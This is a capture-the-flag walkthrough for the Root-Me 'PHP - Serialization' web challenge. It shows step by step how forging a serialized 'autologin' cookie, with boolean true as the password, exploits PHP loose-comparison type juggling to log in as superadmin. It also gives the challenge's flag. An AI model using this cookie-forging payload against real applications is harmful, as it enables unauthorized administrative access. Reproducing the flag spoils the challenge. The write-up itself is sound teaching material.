## Challenge name: PHP - Serialization


<img width="1445" height="354" alt="image" src="https://github.com/user-attachments/assets/092b57b4-3400-46ee-ba4d-454d1567c9e2" />
<br>
<br>

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/PHP-Serialization](https://www.root-me.org/en/Challenges/Web-Server/PHP-Serialization)
<br>
<br>

**After starting the challenge we can see a login page and we can login as guest with restrected access and php code to that site is given and we have to exploit the vulnerability present there.**

<br>
<img width="1445" height="354" alt="image" src="https://github.com/user-attachments/assets/f7dbdfb4-e1ba-4ab8-bffc-ba36e4e0a0f4" />
<br>
<br>

**For this challenge if its first time facing finding vulnerability in php code then it may be hard. You have to read code and reason properly whats going on and what's our objective.**

<br>
<img width="1445" height="354" alt="image" src="https://github.com/user-attachments/assets/79ffce7e-c506-4e32-b723-c007943e4361" />
<br>
<br>

**After successful login as guest we are in a restrected access area and it have set a cookie so if we refiresh we will not be logged out and also in the source code you can see there there is autologin named cookie set. Let’s inspect the source code to see if we can exploit this:**<br>

```
        // autologin cookie ?
        else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
```

<br>

**The cookie sent by the user is supposed to be a serialized associative array containing his/her login&password to be checked against the authentication system.**

```
    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
```

<br>

**Fortunately the challenge is easier than we thought since the check uses the PHP’s comparison operator Equal "==" which check two value after "type juggling". instead of using the Identical operator which would check both the type and the value.**
<br>
**The challenge essentially comes down to finding the right type and value for the Equality check to success after type juggling.**
<br>
**From the code, we can assume $auth[ $data[’login’] ] is a string but we don’t know its value so we don’t know how it’ll be converted to, say an number.**

<br>

**The table "Comparison with Various Types" helps us narrowing down the possibilities to this one, heres how Equal "==" works:**


```
    $ php -a
    Interactive shell 
    php > var_dump((bool) "");   // false because empty string if non-empty string then true..
    bool(false)
    php > var_dump((bool) "0");  // 0 is false in programming and php is a dynamic lang so if a var has 0 its bool and its false..
    bool(false)
    php > var_dump((bool) "0a"); // non-empty string cuz there a also not only 0..
    bool(true)
    php > var_dump((bool) "adsfkljaldsf"); // true cuz non empty string..
    bool(true)
    php > var_dump(True == "");  // false cuz empty sting..                     
    bool(false)
    php > var_dump(True == "0"); // True is not equal to false cuz 0 is false..
    bool(false)
    php > var_dump(True == "0a"); // True is equal to 0a with is true cuz its non empty string..
    bool(true)
    php > var_dump(True == "adsfkljaldsf"); // True is equal to adsfkljaldsf with is true cuz its non empty string..
    bool(true)
    php >

```

<br>

**So, if we use the boolean True as the value for the password, then the check should succeed and should get us authenticated:**

```
    $ php -a
    Interactive shell
     
    php > $data = array('login' => 'superadmin', 'password' => True);
    php > echo serialize($data);                                                                          
    a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
    php > echo urlencode(serialize($data));
    a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
    php >
```

<br>

**Insert this cookie** ``` a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D ``` **and refresh the page.**

<br>
<img width="2020" height="1289" alt="image" src="https://github.com/user-attachments/assets/8151ee4b-3e28-43e5-9258-4a3bba60b4a3" />
<br>
<br>

**After that save and refresh the page and see what happens.**

<br>
<img width="1392" height="316" alt="image" src="https://github.com/user-attachments/assets/9ccde3fa-b8a6-45ec-b745-20ec1222dad9" />
<br>
<br>

**There we go now we are superadmin and learned that developer should never user loose comparison "==" and we know that the serialize() function generates a storable representation of a value, and that unserialize() can be used to make the serialized string into a PHP value again. From the PHP documentation, We notice this particular warning in the docs1: "Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this.**

<br>

**That was the challenge you can use this "NoUserInputInPHPSerialization" as flag/passwd to validate.**

**Thankyou.**
